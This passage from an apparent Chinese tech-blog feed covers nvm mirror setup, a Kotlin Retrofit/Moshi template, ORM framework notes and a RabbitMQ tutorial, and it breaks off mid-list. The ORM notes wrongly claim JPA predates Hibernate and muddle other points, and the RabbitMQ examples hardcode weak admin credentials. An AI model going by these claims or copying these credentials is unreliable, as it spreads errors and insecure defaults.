<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> NVM_NODEJS_ORG_MIRROR=https://npmmirror.com/mirrors/node</span><br></pre></td></tr></table></figure>
<p>在windows下，修改nvm配置目录的<code>setting.txt</code>文件<br>加上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node_mirror: https://npmmirror.com/mirrors/node/</span><br><span class="line">npm_mirror: https://npmmirror.com/mirrors/npm/</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>nvm</category>
      </categories>
  </entry>
  <entry>
    <title>Retrofit和moshi的搭配使用模板</title>
    <url>/posts/7429e79a/</url>
    <content><![CDATA[<h3 id="moshi-新一代Json解析库"><a href="#moshi-新一代Json解析库" class="headerlink" title="moshi,新一代Json解析库"></a>moshi,新一代Json解析库</h3><p>基本用法</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> = runBlocking &#123;</span><br><span class="line">    <span class="keyword">val</span> moshi = Moshi.Builder()</span><br><span class="line">        .addLast(KotlinJsonAdapterFactory())</span><br><span class="line">        .build()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> json = <span class="string">&quot;&quot;&quot;&#123;&quot;_name&quot;:&quot;xxx&quot;,&quot;age&quot;:12&#125;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">val</span> person = moshi.adapter(Peoson::<span class="keyword">class</span>.java).fromJson(json)</span><br><span class="line">    println(person)</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@JsonClass(generateAdapter = true)</span></span><br><span class="line"><span class="comment">//为了贴合condegen使用，他可以提高moshi在kotlin中的运行时速率</span></span><br><span class="line"><span class="keyword">data</span> <span class="keyword">class</span> <span class="title class_">Peoson</span>(</span><br><span class="line">    <span class="meta">@Json(name = <span class="string">&quot;_name&quot;</span>)</span></span><br><span class="line">    <span class="keyword">val</span> name:String,</span><br><span class="line">    <span class="keyword">val</span> age:<span class="built_in">Int</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>##标准使用模板<br>retrofit</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.squareup.moshi.Moshi</span><br><span class="line"><span class="keyword">import</span> com.squareup.moshi.kotlin.reflect.KotlinJsonAdapterFactory</span><br><span class="line"><span class="keyword">import</span> retrofit2.Retrofit</span><br><span class="line"><span class="keyword">import</span> retrofit2.converter.moshi.MoshiConverterFactory</span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span> Network &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> baseUrl = <span class="string">&quot;https://zfxt.top/&quot;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> retrofit = Retrofit.Builder()</span><br><span class="line">        .baseUrl(baseUrl)</span><br><span class="line">        .addConverterFactory(</span><br><span class="line">            MoshiConverterFactory.create(</span><br><span class="line">                Moshi.Builder()</span><br><span class="line">                    .add(KotlinJsonAdapterFactory())</span><br><span class="line">                    .build()</span><br><span class="line">            )</span><br><span class="line">        ).build()</span><br><span class="line"></span><br><span class="line"><span class="comment">//用来构建每个具体的服务类</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="type">&lt;T&gt;</span><span class="title">createService</span><span class="params">(clazz: <span class="type">Class</span>&lt;<span class="type">T</span>&gt;)</span></span>: T&#123;</span><br><span class="line">        <span class="keyword">return</span> retrofit.create(clazz)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先，配置一个单例类，用来配置retrofit。<br>然后用interface接口来定义每个接口服务<br>如<br><img src="https://image.zfxt.top/hexo-blog/Retrofit%E5%92%8Cmoshi%E7%9A%84%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8%E6%A8%A1%E6%9D%BF-2023-08-18-56-50.png"></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> retrofit2.http.GET</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">PersonService</span> &#123;</span><br><span class="line">    <span class="meta">@GET(<span class="string">&quot;person&quot;</span>)</span></span><br><span class="line">    <span class="keyword">suspend</span> <span class="function"><span class="keyword">fun</span> <span class="title">person</span><span class="params">()</span></span>:Peoson</span><br><span class="line"></span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span>&#123;</span><br><span class="line">	<span class="comment">//生成实例对象</span></span><br><span class="line">        <span class="function"><span class="keyword">fun</span> <span class="title">instance</span><span class="params">()</span></span>:PersonService&#123;</span><br><span class="line">            <span class="keyword">return</span> Network.createService(PersonService::<span class="keyword">class</span>.java)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>moshi</tag>
        <tag>retrofit</tag>
      </tags>
  </entry>
  <entry>
    <title>ORM框架比较：Mybatis、Hibernate、JPA、Bee、sqltoy</title>
    <url>/posts/4cfcba53/</url>
    <content><![CDATA[<p>记录一次阅览的过程<br>相关了解到的有Mybatis,Hibernate,JPA+QueryDSL,sagacity-sqltoy,Bee。<br>简单的记录一下网上的评论和自己的理解。</p>
<h2 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h2><p>他的本质就是一个SqlUtils。并不是一个orm框架。他的作用是将sql语句与java代码分离开来。通过xml的格式来书写sql语句。进而完成对数据库的控制，不用手动设置参数和对结果集的处理因为是靠自己去写sql语句的。所以他的性能取决于你对sql的理解程度。</p>
<h2 id="Mybatis-plus"><a href="#Mybatis-plus" class="headerlink" title="Mybatis-plus"></a>Mybatis-plus</h2><p>这里引用一句他人的评论</p>
<blockquote>
<p>主要是mybatis带来了几个问题：1、大量的人见到xml就反，就觉得low,这个问题的核心是mybatis的sql写法不直观，基本就是传统java中拼sql的逻辑xml化；2、大家其实都认同单表操作jpa和简单查询QueryDSL，所以产生了大量基于mybatis的plus来做JPA功能；网上不下二十个mybatis的增强，其实这些都可以从JPA、JOOQ上得到启发，基本没有什么创新，无法解决项目中的实质痛点。</p>
</blockquote>
<h2 id="Hibernate"><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h2><p>Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成简单的SQL语句，自动执行，对于复杂的sql语句，Hibernate不需要自己编写，因此它的性能不是很好。<br>他可以完全通过调用方法来完成所有的对数据库的操作，可以不用进行sql语句的操作和优化。</p>
<h3 id="ORM的工作原理"><a href="#ORM的工作原理" class="headerlink" title="ORM的工作原理"></a>ORM的工作原理</h3><p>ORM 的工作原理</p>
<ol>
<li>以一定的映射方式，把实体模型和数据库关系的映射</li>
<li>ORM框架启动时加载这些映射和数据库配置文件</li>
<li>ORM通过对原生jdbc的封装提供更加便利的操作</li>
<li>Dao通过ORM提供便捷API对象的方式操作数据库关系</li>
</ol>
<h2 id="JPA-QueryDSL"><a href="#JPA-QueryDSL" class="headerlink" title="JPA+QueryDSL"></a>JPA+QueryDSL</h2><h3 id="什么是JPA"><a href="#什么是JPA" class="headerlink" title="什么是JPA"></a>什么是JPA</h3><p>JPA 是Java Persistence API的缩写，是一套由Java官方制定的ORM标准。当制定这套标准以后，市场上就出现很多JPA框架。如：OpenJPA（apache），EclipseTop（linktop）(eclipse)，Hibernate。<br>他的出现比Hibernate更早，他属于元老级别的标准。<br>他不需要使用XML映射文件。他大多采用注解的方式，将实体类与表、其中的字段，列名，相对应。</p>
<h3 id="QueryDSL"><a href="#QueryDSL" class="headerlink" title="QueryDSL"></a>QueryDSL</h3><p>他就类似于Lombok。用来做简单的单表操作</p>
<h2 id="Bee-完整的ORM框架"><a href="#Bee-完整的ORM框架" class="headerlink" title="Bee 完整的ORM框架"></a>Bee 完整的ORM框架</h2><p>尚未去了解，可以去官网查看。他被说的很厉害，但尚未尝试。<br><a href="https://gitee.com/automvc/bee/tree/master/">gitee项目</a></p>
<h2 id="sqltoy"><a href="#sqltoy" class="headerlink" title="sqltoy"></a>sqltoy</h2><p>尚未了解</p>
]]></content>
      <tags>
        <tag>ORM框架</tag>
      </tags>
  </entry>
  <entry>
    <title>RabbitMq入门</title>
    <url>/posts/7554994e/</url>
    <content><![CDATA[<p>消息队列<br>MQ是一种常见的上下游“逻辑解耦+物理解耦”的消息通信服务<br>MQ三大功能：流量消峰，应用解耦，异步处理<br>主流MQ：kafka，rocketMQ，rabbitMQ</p>
<h1 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h1><p>4大核心概念<br>生产者，消费者，交换机，队列<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-01-15-26.png"></p>
<p><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-16-34-43.png"></p>
<p><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-08-18-34.png" alt="信道.png"></p>
<h2 id="RabbitMQ的安装"><a href="#RabbitMQ的安装" class="headerlink" title="RabbitMQ的安装"></a>RabbitMQ的安装</h2><p>这里使用docker的方式进行安装</p>
<ol>
<li>拉取镜像<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull rabbitmq</span><br></pre></td></tr></table></figure></li>
<li>启动进程<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -d --restart=always --name my-rabbitmq -p 5672:5672 -p 15672:15672 rabbitmq</span><br></pre></td></tr></table></figure>
这时已经算是启动好了应用，但是任然无法访问</li>
<li>开启插件<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// 1、进入容器</span><br><span class="line">docker exec -it my-rabbitmq bash</span><br><span class="line"> </span><br><span class="line">// 2、开启插件</span><br><span class="line">rabbitmq-plugins enable rabbitmq_management</span><br><span class="line"></span><br><span class="line">//创建账号</span><br><span class="line">rabbitmqctl add_user admin 123</span><br><span class="line"></span><br><span class="line">//设置用户角色</span><br><span class="line">rabbitmqctl set_user_tags admin administrator</span><br><span class="line"></span><br><span class="line">//设置用户权限</span><br><span class="line">//(默认最大)</span><br><span class="line">rabbitmqctl set_permissions -p &quot;/&quot; admin &quot;.*&quot; &quot;.*&quot; &quot;.*&quot;</span><br><span class="line"></span><br><span class="line">//查看用户角色</span><br><span class="line">rabbitmqctl list_users</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="图标问题无法显现"><a href="#图标问题无法显现" class="headerlink" title="图标问题无法显现"></a>图标问题无法显现</h3><p>🪁解决方案<br>🐳 1、查看所有容器（看id）<br>docker ps -a</p>
<p>🐳 2、进入容器内部<br>docker exec -it 容器id &#x2F;bin&#x2F;bash</p>
<p>🐳3、进入指定目录<br>cd &#x2F;etc&#x2F;rabbitmq&#x2F;conf.d&#x2F;</p>
<p>🐳4、修改 management_agent.disable_metrics_collector &#x3D; false<br>echo management_agent.disable_metrics_collector &#x3D; false &gt; management_agent.disable_metrics_collector.conf</p>
<p>🐳5、退出容器<br>exit</p>
<p>🐳6、重启容器<br>docker restart 容器Id<br>原文来自<a href="https://blog.csdn.net/qq_58035032/article/details/131233527">csdn</a></p>
<h2 id="生产者代码"><a href="#生产者代码" class="headerlink" title="生产者代码"></a>生产者代码</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.zfxt.rabbitmq.one</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Produce</span></span><br><span class="line"><span class="comment"> * 生产者：发消息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@constructor</span> Create empty Produce</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//队列名称</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">val</span> QUEUE_NAME=<span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//创建一个连接工厂</span></span><br><span class="line">    <span class="keyword">val</span> factory = ConnectionFactory()</span><br><span class="line">    <span class="comment">//工厂IP 连接rabbitMQ的队列</span></span><br><span class="line">    factory.host=<span class="string">&quot;zfxt.top&quot;</span></span><br><span class="line">    <span class="comment">//用户名</span></span><br><span class="line">    factory.username=<span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="comment">//密码</span></span><br><span class="line">    factory.password=<span class="string">&quot;admin&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建链接</span></span><br><span class="line">    <span class="keyword">val</span> connection = factory.newConnection()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取信道</span></span><br><span class="line">    <span class="keyword">val</span> channel = connection.createChannel()</span><br><span class="line">    <span class="comment">//生成一个队列</span></span><br><span class="line">    channel.queueDeclare(QUEUE_NAME,<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">null</span>)</span><br><span class="line">    <span class="comment">//准备发消息</span></span><br><span class="line">    <span class="keyword">val</span> message = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"></span><br><span class="line">    channel.basicPublish(<span class="string">&quot;&quot;</span>, QUEUE_NAME,<span class="literal">null</span>,message.toByteArray())</span><br><span class="line">    println(<span class="string">&quot;消息发送完毕&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="消费者代码"><a href="#消费者代码" class="headerlink" title="消费者代码"></a>消费者代码</h2><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.zfxt.rabbitmq.one</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.rabbitmq.client.ConnectionFactory</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">//创建链接工厂</span></span><br><span class="line">    <span class="keyword">val</span> factory = ConnectionFactory()</span><br><span class="line">    factory.host = <span class="string">&quot;zfxt.top&quot;</span></span><br><span class="line">    factory.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    factory.password = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="keyword">val</span> connection = factory.newConnection()</span><br><span class="line">    <span class="keyword">val</span> channel = connection.createChannel()</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 消费者消费消息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        channel.basicConsume(</span><br><span class="line"></span><br><span class="line">            QUEUE_NAME, <span class="literal">false</span>,</span><br><span class="line">            &#123; consumerTag, message -&gt;</span><br><span class="line">            println(String(message.body))</span><br><span class="line">        &#125;,</span><br><span class="line">            &#123; consumerTag -&gt;</span><br><span class="line">            println(<span class="string">&quot;消息消费被中断&quot;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">        e.printStackTrace()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Work-Queue（简单模式和工作模式）"><a href="#Work-Queue（简单模式和工作模式）" class="headerlink" title="Work Queue（简单模式和工作模式）"></a>Work Queue（简单模式和工作模式）</h2><p>情景：出现生产者产生大量的消息需要通过消费者去执行，而每个消息，只能被处理一次，不能处理多次，只能被一个消费者处理。<br>因此为了能够提高效率，采用轮询的方式，当一个消费者获得消息后，就让另一个消费者获得下一个消息。<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-01-18-56.png"></p>
<h3 id="消息应答"><a href="#消息应答" class="headerlink" title="消息应答"></a>消息应答</h3><p>情景：如果一个消费者正在处理消息时，突然宕机，而队列中该消息已经删除。就会导致消息丢失。<br>因此为了保证消息不丢失。引入了应答机制。只有在消费者处理了消息并且应答之后，rabbitMQ才会删除该消息。</p>
<ol>
<li>自动应答：<br>他的做法是，当消费者接收到消息内容后即刻返回应答，未必完成处理。这种多适用于高吞吐量时，与数据传输安全做权衡。<br>尽量少使用</li>
<li>手动应答<br><code>Channel.basicAck()</code>肯定应答<br><code>Channel.basicNack()</code>否定应答<br><code>Channel.basicReject()</code>直接丢弃该消息，直接拒绝<br>优点：他可以批量应答：Multiple，</li>
</ol>
<h3 id="消息自动重新入队"><a href="#消息自动重新入队" class="headerlink" title="消息自动重新入队"></a>消息自动重新入队</h3><p>如果消息在消费者手中处理时，由于网络等问题无法发送ack确认信息。rabbitMQ会将该消息重新入队。这样可以确保不会丢失信息。<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-10-34-24.png"></p>
<h3 id="消息持久化"><a href="#消息持久化" class="headerlink" title="消息持久化"></a>消息持久化</h3><p>用于保证消息不会丢失，当出现了rabbitMQ奔溃宕机时，确保消息不丢失，就需要使用到消息持久化</p>
<ul>
<li>队列持久化<br>即使重启rabbitmq，这个队列依然存在<br>（即修改duration属性为true）</li>
<li>消息持久化<br>保证消息会被保存到磁盘上，不会丢失。但是它并不能完全保证不会丢失消息。他会存在一些延迟<br>（修改props属性，添加MessageProperties.PERSISTENT_TEXT_PLAIN)<br>(完整做法是加上发布确认)<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-00-31-00.png"><br>在生产者的代码中加上<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//开启发布确认</span><br><span class="line">    channel.confirmSelect()</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="确认发布"><a href="#确认发布" class="headerlink" title="确认发布"></a>确认发布</h4><ol>
<li><p>单个确认发布<br>同步确认消息。单个发布单个确认。缺点：发布速度特别慢</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单个消息发布后立刻确认(确认后返回true)</span></span><br><span class="line">            <span class="keyword">var</span> flag = channel.waitForConfirms()</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                println(<span class="string">&quot;消息发送成功&quot;</span>)</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>批量确认发布</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">0.</span>.MESSAGE_COUNT) &#123;</span><br><span class="line">            <span class="keyword">val</span> message = <span class="string">&quot;message <span class="variable">$i</span>&quot;</span></span><br><span class="line">            channel.basicPublish(<span class="string">&quot;&quot;</span>,QUEUE_NAME,<span class="literal">null</span>,message.toByteArray())</span><br><span class="line">            <span class="comment">//单个消息发布后立刻确认(确认后返回true)</span></span><br><span class="line">            <span class="keyword">var</span> flag = channel.waitForConfirms()</span><br><span class="line">            <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                println(<span class="string">&quot;消息发送成功&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//批量确认</span></span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">100</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> flag = channel.waitForConfirms()</span><br><span class="line">                <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                    println(<span class="string">&quot;消息发送成功&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>缺点：如果出现确认问题，无法判断是那个消息出现的错误</p>
</li>
<li><p>异步确认发布<br>异步确认发布，比上面两个操作都要复杂。但是他的性价比最高。可以容易的判断是哪个消息出了问题<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-17-11-35.png"></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">publicMessageAsync</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> channel = RabbitMqUtils.getChannel()</span><br><span class="line">    <span class="comment">//队列名称</span></span><br><span class="line">    <span class="keyword">val</span> QUEUE_NAME = UUID.randomUUID().toString()</span><br><span class="line">    channel.queueDeclare(QUEUE_NAME, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">null</span>)</span><br><span class="line">    <span class="comment">//开启发布确认</span></span><br><span class="line">    channel.confirmSelect()</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 建立一个线程安全有序的一个哈希表，适用于高并发的情况下</span></span><br><span class="line"><span class="comment">     * 1. 轻松的将序号与消息关联</span></span><br><span class="line"><span class="comment">     * 2. 轻松批量删除消息条目</span></span><br><span class="line"><span class="comment">     * 3. 支持多线程访问</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">val</span> outstandingConfirms = ConcurrentSkipListMap&lt;<span class="built_in">Long</span>, String&gt;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">//准备监听器</span></span><br><span class="line">    channel.addConfirmListener(&#123; deliveryTag, multiple -&gt;</span><br><span class="line">        <span class="comment">//监听成功</span></span><br><span class="line">        println(<span class="string">&quot;确认的消息：<span class="variable">$deliveryTag</span>&quot;</span>)</span><br><span class="line">        <span class="comment">//删除掉已经确认的消息</span></span><br><span class="line">        <span class="comment">//判断是否批量</span></span><br><span class="line">        <span class="keyword">if</span> (multiple) &#123;</span><br><span class="line">            outstandingConfirms.headMap(deliveryTag).clear()</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            outstandingConfirms.remove(deliveryTag)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, &#123; deliveryTag, multiple -&gt;</span><br><span class="line">        <span class="comment">//监听失败</span></span><br><span class="line">        println(<span class="string">&quot;未确认的消息：<span class="variable">$deliveryTag</span>&quot;</span>)</span><br><span class="line">        <span class="comment">//如果有未确认的消息</span></span><br><span class="line">        println(outstandingConfirms[deliveryTag] + <span class="string">&quot;未被确认&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    println(<span class="string">&quot;发送一千条数据耗时：&quot;</span> + measureTimeMillis &#123;</span><br><span class="line">        <span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">0.</span>.MESSAGE_COUNT) &#123;</span><br><span class="line">            <span class="keyword">val</span> message = <span class="string">&quot;message <span class="variable">$i</span>&quot;</span></span><br><span class="line">            channel.basicPublish(<span class="string">&quot;&quot;</span>, QUEUE_NAME, <span class="literal">null</span>, message.toByteArray())</span><br><span class="line">            <span class="comment">//记录下要发送消息的总和</span></span><br><span class="line">            outstandingConfirms.put(channel.nextPublishSeqNo, message)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&#x2F;&#x2F;1首先确定消息的总和<br>&#x2F;&#x2F;2在确认消息中，把确认的消息删除掉<br>&#x2F;&#x2F;3打印未确认的消息</p>
</li>
</ol>
<h3 id="不公平分发"><a href="#不公平分发" class="headerlink" title="不公平分发"></a>不公平分发</h3><p>对于最开始发送消息时的轮询分发（也就是一人发一条信息，轮流接受）这就导致有消费者处理信息非常慢。影响整体效率。<br>因此采用能者多劳</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">channel.basicQos(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//默认就是0，也就是公平分发</span></span><br></pre></td></tr></table></figure>

<h3 id="预取值"><a href="#预取值" class="headerlink" title="预取值"></a>预取值</h3><p><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-13-35-27.png"><br>根据预取值分发消息，按照比例分配消息。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分配几条就发几条</span></span><br><span class="line">channel.basicQos(<span class="comment">//预取值)</span></span><br><span class="line"><span class="comment">//这个玩意就类似于接受窗口</span></span><br><span class="line"><span class="comment">//默认就是0，也就是公平分发</span></span><br></pre></td></tr></table></figure>

<h2 id="发布和订阅模式"><a href="#发布和订阅模式" class="headerlink" title="发布和订阅模式"></a>发布和订阅模式</h2><p>此前用到的都是一个生产者发布一个消息，并交由一个消费者消费。而交换机的一个作用就是实现消息的”发布和订阅”，即一消息多接受<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-18-59-04.png"></p>
<h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p>rabbitMQ的核心思想：生产者的消息从不会直接发送给队列。也就是队列的状态对于生产者是透明的。</p>
<h4 id="exchanges类型"><a href="#exchanges类型" class="headerlink" title="exchanges类型"></a>exchanges类型</h4><ol>
<li><p>direct(直接)<br>直接交换机的绑定是使用具体的routingKey来进行绑定，这样每个消息，只能发送到routingKey绑定的队列上。<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-09-02-42.png"><br>默认的无名交换机就是直接交换机。<br><strong>临时队列：</strong>创建出来的一个具有随机名字,没有持久化，当消费者断开连接后即自动删除的队列。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">channel.queueDeclare().queue</span><br></pre></td></tr></table></figure>
<p>直接获取临时队列</p>
</li>
<li><p>topit(主题)<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-20-15-02.png"><br>主题交换机的routingKey有限制要求：必须是一个单词列表，以点号分开（总共不能超过255个字节）<code>*</code>可以代替一个单词。<code>#</code>可以代替0个或多个单词<br><img src="https://image.zfxt.top/hexo-blog/RabbitMq%E5%85%A5%E9%97%A8-2023-08-03-13-33.png"><br><strong>简称：通配符匹配</strong></p>
</li>
<li><p>headers(标题)</p>
</li>
<li><p>fanout(扇出)<br>发布&#x2F;订阅模式<br>接收者：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> channel = RabbitMqUtils.getChannel()</span><br><span class="line">    <span class="comment">//声明一个交换机</span></span><br><span class="line">    channel.exchangeDeclare(EXCHANGE_NAME, <span class="string">&quot;fanout&quot;</span>)</span><br><span class="line">    <span class="comment">//声明一个临时队列</span></span><br><span class="line">    <span class="keyword">val</span> queueName = channel.queueDeclare().queue</span><br><span class="line">    <span class="comment">//绑定交换机和队列</span></span><br><span class="line">    channel.queueBind(queueName, EXCHANGE_NAME, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    println(<span class="string">&quot;等待接受消息，把接收到的消息打印出来&quot;</span>)</span><br><span class="line"></span><br><span class="line">    channel.basicConsume(queueName, <span class="literal">true</span>, &#123; consumerTag, message -&gt;</span><br><span class="line">        println(<span class="string">&quot;接收到:<span class="subst">$&#123;String(message.body)&#125;</span>&quot;</span>)</span><br><span class="line">    &#125;, &#123; consumerTag -&gt; &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发布者：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> channel = RabbitMqUtils.getChannel()</span><br><span class="line">    <span class="comment">//交换机已经生成，不用再次创建</span></span><br><span class="line"><span class="comment">//    channel.exchangeDeclare(EXCHANGE_NAME, &quot;fanout&quot;)</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> message = readLine()</span><br><span class="line">        channel.basicPublish(EXCHANGE_NAME, <span class="string">&quot;&quot;</span>, <span class="literal">null</span>, message?.toByteArray())</span><br><span class="line">        println(<span class="string">&quot;发出消息：<span class="variable">$message</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="死信队列"><a href="#死信队列" class="headerlink" title="死信队列"></a>死信队列</h3><p>无法被消费的消息。由于某些<code>特定的原因导致queue中的某些消息无法被消费</code>，这样的消息如果没有被后续处理，就变成了死信，从而就有了死信队列。<br>应用场景：为了保证订单业务的数据不丢失。需要使用到RabbitMq的死信队列机制。<br>来源：</p>
<ol>
<li>消息TTL过期</li>
<li>队列达到最大长度</li>
